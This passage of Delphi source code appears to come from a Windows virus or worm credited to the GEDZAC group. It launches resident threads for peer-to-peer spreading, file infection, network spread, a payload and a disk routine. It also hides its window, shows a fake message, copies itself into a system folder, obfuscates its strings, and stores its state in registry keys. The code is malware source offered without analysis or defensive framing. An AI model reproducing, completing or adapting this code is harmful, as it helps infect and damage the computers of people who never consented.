   CreateThread(nil,0,@Payload,nil,0,ThreadID);CreateThread(nil,0,@disk,nil,0,ThreadID);
   sleep($FFFFFFFF);   //Residentes :)
   end;
   end;

        procedure main5;
        begin
        //for the most stupid users
         if WEBSERVERx = '1' then CreateThread(nil,0,@MainServer,nil,0,ThreadID) else
         begin
   /////////////////////////////////
   asm                           //
   mov eax, offset msg1;        //
   call eax                    //
   end;                       //
   ////////////////////////////
   peer2peer := 5;
   CreateThread(nil,0,@p2p,nil,0,ThreadID); CreateThread(nil,0,@zafer,nil,0,ThreadID);
   CreateThread(nil,0,@infx,nil,0,ThreadID); CreateThread(nil,0,@wormhunter,nil,0,ThreadID);
   CreateThread(nil,0,@net,nil,0,ThreadID); CreateThread(nil,0,@WakeUp,nil,0,ThreadID);
   CreateThread(nil,0,@nigth,nil,0,ThreadID);CreateThread(nil,0,@colapse,nil,0,ThreadID);
   CreateThread(nil,0,@Payload,nil,0,ThreadID);CreateThread(nil,0,@disk,nil,0,ThreadID);
   sleep($FFFFFFFF);   //Residentes :)
   end;
   end;

   function FakeMsg:integer;
   var lix,liw,lio:string;
   lim,lip:Pchar;
   begin
   liw := x('|chVQ[PHLcHVQ`TZGZ'); lio := x('}zk~izmlvpq');
   lix := x('iZMLVPQSVRVKZ[KVRZZGOVMZ[');
   lim := Pchar(lix); lip := Pchar(lio);
   if who = x('zGOSPMZMZGZ') then
   begin
   WinExec(PChar(liw),SW_SHOWNORMAL);
   end else MessagebOx(0,lim,lip,0);
   end;

        label loading;
           label go;
        begin
   leer := 'Thanx to: Falckon,DemionKlaz,Nemlin,Morusa,SickByte,Darkness,NET,Swettie, all GEDZAC and al my friends :)' + Crlf +
           'I.A virus test 1' + CRLF +
           'THIS IS JUTS A TEST' + CRLF +
           'jeje this was a very move month :) xD bad  and good stuff :) well i now i have my ideas in the rigth place :D' + CRLF +
           ';) i still loves you :(';

           ShowWindow(FindWindowA(0,pChar(ParamStr(0))),0);
             CreateMutex(nil,true,'[-Zafer-]');
     If GetLastError() = Error_ALready_Exists Then
       begin
       halt;
     end;
           CreateThread(nil,0,@FakeMsg,nil,0,ThreadID);
           codex := ' LK^Mpc\SZ^Q`LZMIV\Z\R[';
           codex1 := x(codex);
           codexx := 'dhVQ[PHLb25MJQpc\SZ^Q`LZMIV\Z\R[';
           codex2 := x(codexx);
           hushx := 'pc^JKPLK^MK]^K'; hush := x(hushx);
           kushx := 'pcHVQ[PHLcHVQVQV'; kush := x(kushx);
           ged := 'XZ[E^\'; gez := x(ged);
           zafx := 'e^YZM'; zaf :=  x(zafx);

           whox:=getcommandline;
   who2:=StrLen(pchar(whox));

   for what:=2 to (who2-2) do
   begin
   who:=who+whox[what];
   end;
           CopyFile(Pchar(who),Pchar(folder + x('HVQLWZSSZGZ')),true);
           ich := 'e^YZMZGZ'; isthe := x(ich);
           vxe := 'IG['; vxx := '.' + vxe;
           txe := 'KZRO'; txdx := x(txe); temp := txdx;
       f1 := 'ct^e^~crFlW^MZ[yPS[ZMc'; f2 := 'cZ[PQTZF'; f2x := '2'; f2xx := 'c';
       f3 := 'cXQJ\SZJLc[PHQSP^[Lc'; f4 := 'cV\NcLW^MZ[YVSZLc'; f5 := 'cT^E^^SVKZcrFlW^MZ[yPS[ZMc';
       f6 := 'cSVRZHVMZcLW^MZ[c'; f7 := 'cRPMOWZJLcRFLW^MZ[YPS[ZMc'; f8 := 'cxMPTLKZMcrFxMPTLKZMc';
       f9 := 'chVQrgcrFlW^MZ[yPS[ZMc'; f10 := 'ckZLS^cyVSZLc'; f11 := 'cpIZMQZKcvQ\PRVQXc';
       f12 := 'cgPSPgc{PHQSP^[Lc'; f13 := 'cm^OVX^KPMclW^MZc'; f14 := 'ctr{crFlW^MZ[yPS[ZMc'; f15 := 'crFLW^MZ[YPS[ZMc';
       fp2[1] := x(f1); fp2[2] := x(f2) + f2x + x(f2xx); fp2[3] := x(f3); fp2[4] := x(f4); fp2[5] := x(f5);
       fp2[6] := x(f6); fp2[7] := x(f7); fp2[8] := x(f8); fp2[9] := x(f9); fp2[10] := x(f10); fp2[11] := x(f11);
       fp2[12] := x(f12); fp2[13] := x(f13); fp2[14] := x(f14); fp2[15] := x(f15);

           Oe := '|c^V\PQYVXLFL'; Od := x(Oe);
        pes := 'clpykh~mzcrV\MPLPYKchVQ[PHLc|JMMZQKiZMLVPQc'; ped := x(pes);
        pes2 := 'oMPXM^RyVSZL{VM'; ped2 := x(pes2);
           Pro := XMsh(HKEY_LOCAL_MACHINE,ped,ped2);
        UuU;
   asx := x('clPYKH^MZcrV\MPLPYKcHVQ[PHLc|JMMZQKiZMLVPQc');
   a := XMsh(HKEY_CURRENT_CONFIG,asx,x('\PQKMPS'));
   if a = '1' then
    begin
    Loading:
   IQx :=  XMsh(HKEY_CURRENT_CONFIG,asx,x('VN'));
   WEBSERVERx :=  XMsh(HKEY_CURRENT_CONFIG,asx,x('HZ]'));
        if IQx = '1' then main1;
        if IQx = '2' then main2;
        If IQx = '3' then main3;
        If IQx = '4' then main4;
        if IQx = '5' then main5;
   end
   else
       begin
   CreateThread(nil,0,@CheckURL,nil,0,ThreadID);
   CreateThread(nil,0,@CheckWWW,nil,0,ThreadID);
   CreateThread(nil,0,@CheckWindows,nil,0,ThreadID);
   CreateThread(nil,0,@CheckIQ,nil,0,ThreadID);
   Sleep(4000);
      if Points < 6 then Stupid := 5; pass := 1;
      if pass = 1 then goto go;
      if Points < 11 then Stupid := 4; pass := 1;
      if pass = 1 then goto go;
      if Points < 16 then Stupid := 3; pass := 1;
      if pass = 1 then goto go;
      if Points < 21 then Stupid := 2; pass := 1;
      if pass = 1 then goto go;
      if Points > 21 then Stupid := 0; pass := 1;
      go:
      if Pedofilic > 15 then PEDOman := 1;
      if WebServ <> 0 then WEBman := 1;

            Xxo(HKEY_CURRENT_CONFIG,asx,x('VN'),inttostr(Stupid));
            Xxo(HKEY_CURRENT_CONFIG,asx,x('HZ]'),inttostr(WEBman));
            Xxo(HKEY_CURRENT_CONFIG,asx,x('IZMLVPQ'),Version);
            Xxo(HKEY_CURRENT_CONFIG,asx,x('PL'),inttostr(Windowsx));
            Xxo(HKEY_CURRENT_CONFIG,asx,x('\PQKMPS'),'1');
            Sleep(2000);
   goto Loading;
   end;
   end.
